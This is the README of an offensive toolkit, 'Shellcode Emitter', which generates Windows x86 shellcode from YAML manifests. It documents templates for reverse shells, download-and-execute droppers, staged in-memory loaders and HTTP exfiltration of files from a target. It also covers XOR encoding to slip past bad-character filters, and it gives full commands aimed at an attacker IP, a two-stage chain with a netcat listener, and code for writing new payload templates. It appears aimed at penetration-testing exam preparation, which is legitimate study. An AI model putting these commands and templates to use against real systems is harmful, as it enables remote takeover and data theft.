# Shellcode Emitter

A Python toolkit that takes a YAML manifest describing what your shellcode needs
(APIs, strings, badchars) and produces:

- `emitter_out/asm/generated.asm` -- full x86 assembly (PEB walk + API resolution + payload)
- `emitter_out/Documentation/contract.md` -- stack layout map and API reference
- `emitter_out/bin/shellcode.{bin,hex,py,c}` -- assembled output in multiple formats (requires keystone or nasm)

---

## Prerequisites

```bash
# Run from repo root
uv run emitter --help

# Assembly backend: nasm (preferred) or keystone-engine
# nasm: install via package manager and add to PATH
# keystone: pip install keystone-engine
```

---

## Quick start

```bash
# Reverse shell
uv run emitter Tools/emitter/manifests/revshell.yaml \
    --lhost 192.168.1.10 --lport 4444

# HTTP download and run
uv run emitter Tools/emitter/manifests/http_download.yaml \
    --url "http://192.168.1.10:8000/payload.exe" \
    --dst "C:\\Windows\\Temp\\payload.exe"

# HTTP POST exfiltration
uv run emitter Tools/emitter/manifests/http_exfil.yaml \
    --url "http://192.168.1.10:8000/exfil" \
    --src "C:\\Users\\admin\\secret.txt"
```

The manifest's `template` field selects the payload template automatically.
Use `--template` only to override it.

Outputs:
```
[+] Generated: emitter_out/asm/generated.asm
[+] Debug:     emitter_out/asm/debug_runner.py
[+] Snippet:   emitter_out/asm/code_snippet.py
[+] Contract:  emitter_out/Documentation/contract.md
[+] Assembler: nasm
[+] Shellcode: 826 bytes (raw)
[+] Hex:       emitter_out/bin/shellcode.{bin,hex,py,c}
[+] Harness:   emitter_out/bin/test_harness.py
```

---

## CLI reference

```
uv run emitter <manifest> [options]

Arguments:
  manifest              Path to YAML manifest file

Options:
  --template NAME       Payload template to use (see Templates section)
  --out DIR             Output directory (default: emitter_out)
  --lhost IP            Attacker IP or interface name (e.g. tun0).
                        Auto-extracted from --url for http_download/http_exfil.
  --lport PORT          Attacker port.
                        Auto-extracted from --url for http_download/http_exfil.
  --command CMD         Command to run (run_command template, default: cmd.exe)
  --src PATH            Source file path on target (copy_file / http_exfil)
  --dst PATH            Destination file path on target (tcp_download / http_download)
  --url URL             Full URL for http_download (GET) or http_exfil (POST).
                        Auto-derives --lhost/--lport when not explicitly set.
  --payload-file PATH   Local file being served; sets VirtualAlloc size to
                        match (rounded up to page boundary). Default: 1 MiB.
  --encode              Apply single-byte XOR encoding with self-decoding stub
                        when the assembled shellcode contains badchar violations.
  --no-assemble         Skip binary assembly, emit .asm only
```

---

## Manifest format

Manifests are YAML files that declare everything the shellcode needs.

```yaml
# badchars: bytes that will be mangled in transit
badchars: ["00", "0a", "0d"]

# functions: Win32 APIs to resolve (must be in api_database.py)
functions:
  - LoadLibraryA
  - WSAStartup
  - WSASocketA
  - connect

# variables: named 4-byte stack slots for runtime values (handles, pointers, etc.)
variables:
  - socket_handle

# strings: data to construct on the stack frame
strings:
  - label: cmd          # referenced by templates as layout.slot("cmd")
    value: cmd.exe
    method: mov         # mov | shiftor | xor | push
    dest: edi           # destination register (default: edi)
```

### String methods

| Method | Description |
|---|---|
| `mov` | DWORD-at-a-time writes via `mov [edi+N], eax` |
| `shiftor` | Build each DWORD via shift+or (avoids certain byte patterns) |
| `xor` | XOR-encode each DWORD against a mask |
| `push` | Push DWORDs onto the stack; ESP points to the string after |

All methods avoid badchar bytes in the instruction encoding automatically.

---

## Templates

### `reverse_shell`
Connects back to `--lhost:--lport` and spawns `cmd.exe` with stdio redirected to the socket.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/revshell.yaml \
    --template reverse_shell --lhost 192.168.1.10 --lport 4444 \
    --out emitter_out/
```

Required manifest functions: `LoadLibraryA`, `WSAStartup`, `WSASocketA`, `connect`, `CreateProcessA`  
Required variables: `socket_handle`  
Required strings: `cmd`

---

### `run_command`
Executes a command via `WinExec`. Uses the `cmd` string slot if present; falls back to inline push.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/calc.yaml \
    --template run_command --command calc.exe \
    --out emitter_out/
```

Required functions: `WinExec`

---

### `copy_file`
Copies one file to another location via `CopyFileA`.

Required functions: `CopyFileA`  
Required strings: `src_path`, `dst_path`

---

### `copy_then_run`
Copies a file to `--dst` then executes it via `WinExec`. The destination path serves as both the copy target and the command line.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/copy_then_run.yaml \
    --template copy_then_run \
    --src "C:\\tools\\payload.exe" \
    --dst "C:\\Windows\\Temp\\payload.exe" \
    --out emitter_out/
```

Required functions: `CopyFileA`, `WinExec`  
Required strings: `src_path`, `dst_path`

---

### `tcp_download`
Connects to `--lhost:--lport`, receives a file using the staging protocol, writes it to
`--dst`, then executes it via `WinExec`. Never produces an executable stage -- the file
lands on disk.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/tcp_download.yaml \
    --template tcp_download \
    --lhost 192.168.1.10 --lport 9002 \
    --dst "C:\\Windows\\Temp\\payload.exe" \
    --out emitter_out/
```

Required functions: `LoadLibraryA`, `WSAStartup`, `WSASocketA`, `connect`, `recv`,
`closesocket`, `VirtualAlloc`, `CreateFileA`, `WriteFile`, `CloseHandle`, `WinExec`  
Required variables: `socket_handle`, `file_handle`, `virt_buf`, `bytes_total`, `bytes_recvd`  
Required strings: `dst_path`

Serve the file with `tcp_stage_server.py` (see Staging Server section below).

---

### `tcp_stager`
Stage 1 of a multi-stage chain. Connects to `--lhost:--lport`, downloads raw shellcode
bytes into executable memory (`VirtualAlloc` with `PAGE_EXECUTE_READWRITE`), then
transfers control. Never touches disk.

```bash
uv run -m Tools.emitter Tools/emitter/manifests/tcp_stager.yaml \
    --template tcp_stager \
    --lhost 192.168.1.10 --lport 9002 \
    --out emitter_out/stage1/
```

Required functions: `LoadLibraryA`, `WSAStartup`, `WSASocketA`, `connect`, `recv`,
`closesocket`, `VirtualAlloc`  
Required variables: `socket_handle`, `virt_buf`, `bytes_total`, `bytes_recvd`

Stage 2 is a separate emitter build (any template) assembled to `.bin` and served
by `tcp_stage_server.py`.

---

### `bind_shell` (scaffold)
Partial implementation -- `WSAStartup` and `WSASocketA` are generated; `bind` / `listen` /
`accept` stubs are marked TODO. Complete manually.

---

### `http_download`
Downloads a file over HTTP via WinInet and executes it. No Winsock setup needed --
`wininet.dll` handles the full HTTP stack.

```bash
uv run emitter Tools/emitter/manifests/http_download.yaml \
    --url "http://192.168.1.10:8000/payload.exe" \
    --dst "C:\\Windows\\Temp\\payload.exe"
```

`--lhost` and `--lport` are auto-extracted from `--url` when not given explicitly.
Use `--payload-file` to size the VirtualAlloc buffer to match the served file.

Required functions: `LoadLibraryA`, `InternetOpenA`, `InternetOpenUrlA`,
`InternetReadFile`, `InternetCloseHandle`, `VirtualAlloc`, `CreateFileA`,
`WriteFile`, `CloseHandle`, `WinExec`
Required variables: `inet_session`, `inet_url`, `virt_buf`, `file_handle`,
`bytes_read`, `bytes_total`
Required strings: `wininet_dll`, `user_agent`, `url`, `dst_path`

Serve the file:
```bash
python3 -m http.server 8000 --bind 192.168.1.10
```

---

### `http_exfil`
Reads a file from the target and POSTs its contents to the attacker's HTTP server.
Uses `CreateFileA` / `ReadFile` to read the file, then `InternetConnectA` /
`HttpOpenRequestA` / `HttpSendRequestA` to POST it.

```bash
uv run emitter Tools/emitter/manifests/http_exfil.yaml \
    --url "http://192.168.1.10:8000/exfil" \
    --src "C:\\Users\\admin\\Desktop\\secret.txt" \
    --payload-file secret.txt
```

Required functions: `LoadLibraryA`, `InternetOpenA`, `InternetConnectA`,
`HttpOpenRequestA`, `HttpSendRequestA`, `InternetCloseHandle`, `VirtualAlloc`,
`CreateFileA`, `ReadFile`, `CloseHandle`
Required variables: `inet_session`, `inet_connect`, `inet_request`,
`file_handle`, `virt_buf`, `bytes_read`, `bytes_total`
Required strings: `wininet_dll`, `user_agent`, `exfil_host`, `url_path`,
`http_post`, `src_path`

Catch the POST:
```bash
python3 Tools/http_exfil_server.py --port 8000
```

The server saves each POST body as a timestamped `.bin` file.

---

### `move_then_run`
Moves a file to a new location via `MoveFileA`, then executes it via `WinExec`.

Required functions: `MoveFileA`, `WinExec`
Required strings: `src_path`, `dst_path`

---

## XOR encoder

When `--encode` is passed and the assembled shellcode contains badchar violations,
the emitter applies a single-byte XOR encoding. It searches for a key byte (0x01-0xFF)
that is not in the badchar set and does not appear in the raw shellcode, then:

1. XORs every byte of the payload with that key
2. Prepends a self-decoding stub that XORs the payload back at runtime

The stub uses a `lods` / `xor` / `stos` loop and is position-independent.
The final output is the stub + encoded payload, ready for delivery.

```bash
uv run emitter Tools/emitter/manifests/revshell.yaml \
    --lhost 192.168.1.10 --lport 4444 --encode
```

---

## Stack layout

The emitter allocates a dynamically sized frame with `mov ebp, esp` /
`sub esp, <frame_size>` (rounded up to the next 0x100 boundary from the
layout high-water mark). Slots are assigned in strict zones:

| Zone | Offsets | Contents |
|---|---|---|
| Export context | `[ebp-0x04]` -- `[ebp-0x18]` | PEB walk internals -- **do not allocate here** |
| Module bases | `[ebp-0x20]` + | One 4-byte slot per required DLL, in `MODULE_LOAD_ORDER` sequence |
| API pointers | After module bases | One 4-byte slot per function, in manifest declaration order |
| Variables | After API pointers | One 4-byte slot per variable, in manifest declaration order |
| Structures | `[ebp-0x80]` + | Hard-start at 0x80; structs in first-seen order via `requires_structs` |
| Strings | After structures | 4-byte aligned; strings in manifest declaration order |

The generated `contract.md` shows the exact offset for every slot in a given build.

---

## Staging protocol

All network templates that receive data use the same wire protocol:

```
[4 bytes, little-endian uint32]   payload size
[payload_size bytes]              raw payload
```

For `tcp_stager`: payload is raw shellcode bytes.  
For `tcp_download`: payload is the raw file to write to disk.

---

## Staging server

`Tools/tcp_stage_server.py` serves any file using the staging protocol above.

```bash
# Serve stage 2 shellcode on port 9002
python Tools/tcp_stage_server.py --port 9002 --file emitter_out/stage2/bin/shellcode.bin

# Serve a file for tcp_download on port 9003
python Tools/tcp_stage_server.py --port 9003 --file payload.exe
```

The server loops -- each new connection gets a fresh copy of the file. Stop with Ctrl-C.

---

## Exfil server

`Tools/http_exfil_server.py` catches HTTP POST requests and saves each body to disk.

```bash
# Listen on port 8000, save to current directory
python3 Tools/http_exfil_server.py --port 8000

# Save to a specific directory
python3 Tools/http_exfil_server.py --port 8000 --out exfil_data/
```

Each POST body is saved as `YYYYMMDD_HHMMSS_<path>.bin`. The server prints the
byte count and output path for each request.

---

### Two-stage chain example

```bash
# Build stage 1 -- stager connecting to port 9002
uv run -m Tools.emitter Tools/emitter/manifests/tcp_stager.yaml \
    --template tcp_stager --lhost 192.168.1.10 --lport 9002 \
    --out emitter_out/stage1/

# Build stage 2 -- reverse shell connecting back on port 4444
uv run -m Tools.emitter Tools/emitter/manifests/revshell.yaml \
    --template reverse_shell --lhost 192.168.1.10 --lport 4444 \
    --out emitter_out/stage2/

# Serve stage 2 (stage 1 fetches it at runtime)
python Tools/tcp_stage_server.py --port 9002 --file emitter_out/stage2/bin/shellcode.bin

# Start listener for stage 2 reverse shell
nc -lvp 4444

# Deliver stage 1 shellcode to target
```

---

## Badchar safety

All string construction avoids badchar bytes automatically. For immediate values in
payload templates (IP addresses, ports, constants like `MAKEWORD(2,2)`), the emitter
uses `encode.py` helpers that compute a per-byte XOR mask:

```asm
; IP 192.168.1.0 -- last byte 0x00 is a badchar
mov  eax, 0xc1a902XX     ; encoded (no badchars)
xor  eax, 0x01010101     ; mask (no badchars) -> eax = 0xc0a80100
mov  dword ptr [edi+0x04], eax
```

The manifest `badchars` list is authoritative -- it flows through to all encoding
decisions automatically.

---

## Verification checklist

```bash
# 1. Tests
uv run pytest Tools/emitter/tests/ -q
# Expect: 326 passed, 1 deselected

# 2. Each template builds
uv run emitter Tools/emitter/manifests/revshell.yaml \
    --lhost 192.168.1.10 --lport 4444 --out emitter_out/
uv run emitter Tools/emitter/manifests/copy_then_run.yaml --out emitter_out/
uv run emitter Tools/emitter/manifests/tcp_download.yaml \
    --lhost 192.168.1.10 --lport 9002 \
    --dst "C:\\Windows\\Temp\\p.exe" --out emitter_out/
uv run emitter Tools/emitter/manifests/tcp_stager.yaml \
    --lhost 192.168.1.10 --lport 9002 --out emitter_out/stage1/
uv run emitter Tools/emitter/manifests/http_download.yaml \
    --url "http://192.168.1.10:8000/payload.exe" --out emitter_out/
uv run emitter Tools/emitter/manifests/http_exfil.yaml \
    --url "http://192.168.1.10:8000/exfil" \
    --src "C:\\secret.txt" --out emitter_out/
# Expect: [+] Generated + [+] Shellcode for each

# 3. Stage server round-trip
python Tools/tcp_stage_server.py --port 9999 \
    --file emitter_out/stage1/asm/generated.asm &
python -c "
import socket, struct
s = socket.socket()
s.connect(('127.0.0.1', 9999))
n = struct.unpack('<I', s.recv(4))[0]
d = s.recv(n)
print('OK' if len(d) == n else 'MISMATCH', f'{len(d)} bytes')
s.close()
"
kill %1
# Expect: OK N bytes

# 4. Scan generated assembly for badchar bytes in immediates
for f in emitter_out/*/asm/generated.asm emitter_out/stage1/asm/generated.asm; do
    echo "=== $f ==="
    grep -E "^\s+(mov|xor)\s" "$f" \
        | grep -E "0x[0-9a-f]*(00|0a|0d)[0-9a-f]*\b" || echo "  CLEAN"
done
# Expect: CLEAN for each file
```

---

## Adding a new API

1. Add an `APIRecord` entry to `API_DATABASE` in `Tools/emitter/api_database.py`
2. If the API requires a struct, add a `StructRecord` to `STRUCT_DATABASE`
3. If the API is from a new DLL, add a `ModuleInfo` entry to `MODULE_LOAD_ORDER`
4. Add the function name to the relevant manifest's `functions` list
5. Run the test suite to confirm nothing broke

## Adding a new template

1. Create `Tools/emitter/payload_templates/your_template.py` extending `PayloadTemplate`
2. Implement `emit(self, layout, config)` -- use `layout.slot(name).ebp_ref` for all
   stack references, never hardcode offsets
3. Use `encode_dword` / `safe_push_*` / `safe_call_mem` from `..encode` for any
   multi-byte immediate value
4. Register the template in the `registry` dict in `_load_template()` in `build.py`
5. Add the template name to `_VALID_TEMPLATES` in `schema.py` and the `--template`
   choices list in `build.py`
6. Add a manifest under `Tools/emitter/manifests/`
7. The `probe_slots()` method auto-discovers which APIs, variables, and strings your
   template uses -- no manual declarations needed

---

## How to write a custom template

When you need shellcode that calls a combination of APIs the existing templates
don't cover (e.g. TerminateProcess then CreateProcessA, or any exam curveball),
you only write the call sequence. The PEB walk, export hash resolution, string
construction, and badchar handling are all reused.

### 1. Write the manifest

Declare the functions, strings, and variables you need. The emitter resolves
everything automatically.

```yaml
# Tools/emitter/manifests/terminate_relaunch.yaml
template: terminate_relaunch
badchars: ["00", "0a", "0d"]
functions:
  - TerminateProcess
  - WinExec
strings:
  - label: cmd
    value: cmd.exe
    method: mov
```

### 2. Write the template

A template is a Python class with one method: `emit()`. It returns assembly
text. Use `layout.slot("FunctionName")` to get the stack offset for any
resolved API or string -- never hardcode `[ebp-0xNN]`.

```python
# Tools/emitter/payload_templates/terminate_relaunch.py
from __future__ import annotations

from .base import PayloadTemplate, TemplateConfig
from ..encode import safe_push_imm, safe_lea, safe_call_mem


class TerminateRelaunchTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars
        tp_off  = -layout.slot("TerminateProcess").offset
        we_off  = -layout.slot("WinExec").offset
        cmd_off = -layout.slot("cmd").offset

        return "\n".join([
            "; -- Terminate and Relaunch --",
            "",
            "    ; TerminateProcess(GetCurrentProcess(), 0)",
            "    xor  eax, eax",
            "    push eax                    ; uExitCode = 0",
            "    dec  eax                    ; eax = 0xFFFFFFFF (-1 = current process)",
            "    push eax                    ; hProcess",
            *safe_call_mem("ebp", tp_off, bc),
            "",
            "    ; WinExec(&cmd, SW_SHOWNORMAL)",
            *safe_lea("eax", "ebp", cmd_off, bc),
            *safe_push_imm(0x1, bc),
            "    push eax                    ; lpCmdLine",
            *safe_call_mem("ebp", we_off, bc),
            "",
        ])
```

Key rules:
- **Always use `layout.slot(name)`** for offsets. The layout shifts as you
  add or remove functions.
- **Always use `safe_*` helpers** from `..encode` for immediates, lea, and
  call instructions. They handle badchar avoidance automatically.
- **Push args right-to-left** (stdcall convention).
- The framework stubs (PEB walk, hash resolution) run before your template
  code. By the time `emit()` output executes, every function in the manifest
  is resolved and stored at its stack slot.

### 3. Register the template

Add one line to the `registry` dict in `_load_template()` in `build.py`:

```python
"terminate_relaunch": "Tools.emitter.payload_templates.terminate_relaunch.TerminateRelaunchTemplate",
```

And add the name to the `_VALID_TEMPLATES` set in `schema.py`.

### 4. Build

```bash
uv run emitter Tools/emitter/manifests/terminate_relaunch.yaml --out emitter_out/
```

The output is `shellcode.{bin,hex,py,c}` ready to embed in your exploit.

### Minimal template pattern

For the simplest case -- just call one function and exit -- the template is
under 20 lines:

```python
class MyTemplate(PayloadTemplate):
    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars
        func_off = -layout.slot("SomeFunction").offset
        return "\n".join([
            "; -- My Payload --",
            "    xor  eax, eax",
            "    push eax              ; arg2",
            "    push eax              ; arg1",
            *safe_call_mem("ebp", func_off, bc),
        ])
```

Everything above (150+ lines of PEB walk, export resolution, string encoding)
is generated by the framework. You only write the push/call sequence.
